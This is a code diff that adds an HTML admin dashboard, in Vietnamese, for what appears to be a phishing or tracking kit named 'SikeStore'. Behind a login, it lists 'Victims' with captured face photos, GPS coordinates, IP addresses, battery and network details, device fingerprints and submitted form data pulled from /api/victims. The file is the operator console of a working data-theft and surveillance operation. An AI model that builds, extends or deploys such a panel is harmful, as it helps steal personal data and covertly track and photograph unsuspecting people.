@@ -1,0 +1,136 @@
+<!DOCTYPE html>
+<html lang="vi">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Admin - SikeStore</title>
+<style>
+*{box-sizing:border-box;margin:0;padding:0;font-family:-apple-system,Segoe UI,Roboto,sans-serif}
+body{background:#0d1117;color:#eee;padding:15px;font-size:13px}
+.login-box{max-width:340px;margin:80px auto;background:#161b22;border:1px solid #30363d;border-radius:12px;padding:25px}
+h2{margin-bottom:20px;color:#ff4757;font-size:20px;text-align:center}
+input{width:100%;padding:11px 13px;margin-bottom:12px;border-radius:8px;border:1px solid #30363d;background:#0d1117;color:#fff;font-size:14px;outline:none}
+input:focus{border-color:#ff4757}
+button{width:100%;padding:11px;border:none;border-radius:8px;background:#ff4757;color:#fff;font-size:15px;font-weight:bold;cursor:pointer}
+button:active{opacity:.8}
+.err{color:#ff4757;text-align:center;margin-top:10px;font-size:13px;min-height:18px}
+#dash{display:none}
+.header-bar{display:flex;justify-content:space-between;align-items:center;margin-bottom:15px;flex-wrap:wrap;gap:8px}
+.header-bar h2{color:#58a6ff;margin:0;text-align:left}
+.btn-logout{background:#30363d;padding:7px 14px;border-radius:6px;color:#fff;border:none;cursor:pointer;font-size:13px;width:auto}
+.card{background:#161b22;border:1px solid #30363d;border-radius:10px;padding:12px;margin-bottom:10px}
+.card-head{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px;font-size:12px;color:#8b949e;flex-wrap:wrap;gap:6px}
+.card-head .ip{color:#2ed573;font-weight:bold;font-size:13px}
+.photo{width:100%;max-width:200px;border-radius:8px;margin:8px 0;cursor:pointer;display:block}
+pre{background:#0d1117;padding:10px;border-radius:6px;overflow-x:auto;font-size:11px;color:#c9d1d9;white-space:pre-wrap;word-break:break-all;margin-top:8px}
+.tag{display:inline-block;background:#21262d;color:#c9d1d9;padding:2px 8px;border-radius:4px;font-size:11px;margin-right:5px;margin-bottom:4px}
+.empty{text-align:center;padding:40px;color:#8b949e}
+</style>
+</head>
+<body>
+
+<div class="login-box" id="loginBox">
+  <h2>🔐 Admin Login</h2>
+  <input type="text" id="u" placeholder="Tên người dùng" autocomplete="off">
+  <input type="password" id="p" placeholder="Mật khẩu">
+  <button onclick="doLogin()">Đăng nhập</button>
+  <div class="err" id="err"></div>
+</div>
+
+<div id="dash">
+  <div class="header-bar">
+    <h2>📊 Victims (<span id="cnt">0</span>)</h2>
+    <button class="btn-logout" onclick="logout()">Đăng xuất</button>
+  </div>
+  <div id="list"></div>
+</div>
+
+<script>
+let TOKEN = localStorage.getItem('adm_token') || '';
+
+async function doLogin(){
+  const user = document.getElementById('u').value.trim();
+  const pass = document.getElementById('p').value;
+  const err = document.getElementById('err');
+  err.textContent = '';
+  if(!user || !pass){ err.textContent = 'Nhập đủ user/pass'; return; }
+
+  try{
+    const r = await fetch('/api/login',{
+      method:'POST',
+      headers:{'Content-Type':'application/json'},
+      body: JSON.stringify({user, pass})
+    });
+    const d = await r.json();
+    if(d.ok){
+      TOKEN = d.token;
+      localStorage.setItem('adm_token', TOKEN);
+      loadDash();
+    } else {
+      err.textContent = 'Sai tài khoản hoặc mật khẩu';
+    }
+  } catch(e){
+    err.textContent = 'Lỗi kết nối: ' + e.message;
+  }
+}
+
+function logout(){
+  TOKEN = '';
+  localStorage.removeItem('adm_token');
+  location.reload();
+}
+
+async function loadDash(){
+  try{
+    const r = await fetch('/api/victims',{ headers:{ 'x-token': TOKEN } });
+    if(!r.ok){ logout(); return; }
+    const data = await r.json();
+    document.getElementById('loginBox').style.display = 'none';
+    document.getElementById('dash').style.display = 'block';
+    document.getElementById('cnt').textContent = data.length;
+
+    if(!data.length){
+      document.getElementById('list').innerHTML = '<div class="empty">Chưa có dữ liệu</div>';
+      return;
+    }
+
+    document.getElementById('list').innerHTML = data.map((v,i) => {
+      const d = v.data || {};
+      const fp = d.fp || {};
+      const photo = v.face
+        ? `<img class="photo" src="/api/photo/${v.face}?token=${TOKEN}" onclick="window.open(this.src)">`
+        : '<div style="color:#8b949e;padding:10px">Không có ảnh</div>';
+
+      const tags = [];
+      if(d.cameraStatus) tags.push(`📷 ${d.cameraStatus}`);
+      if(d.gpsStatus) tags.push(`📍 ${d.gpsStatus}`);
+      if(d.gpsCoords && d.gpsCoords !== 'Không có, Không có') tags.push(d.gpsCoords);
+      if(d.battery) tags.push(`🔋 ${d.battery}`);
+      if(d.ip) tags.push(`IP ${d.ip}`);
+      if(d.network) tags.push(`📶 ${d.network}`);
+
+      return `<div class="card">
+        <div class="card-head">
+          <span class="ip">#${i+1} — ${v.ip || '?'}</span>
+          <span>${v.time || ''}</span>
+        </div>
+        ${photo}
+        <div>${tags.map(t=>`<span class="tag">${t}</span>`).join('')}</div>
+        <pre>${JSON.stringify({form: d.form, fp: fp, ua: d.ua || v.ua}, null, 1)}</pre>
+      </div>`;
+    }).join('');
+  } catch(e){
+    document.getElementById('list').innerHTML = '<div class="empty">Lỗi: '+e.message+'</div>';
+  }
+}
+
+// Enter để login
+document.getElementById('p').addEventListener('keydown', e => {
+  if(e.key === 'Enter') doLogin();
+});
+
+// Auto check token nếu có
+if(TOKEN) loadDash();
+</script>
+</body>
+  </html>
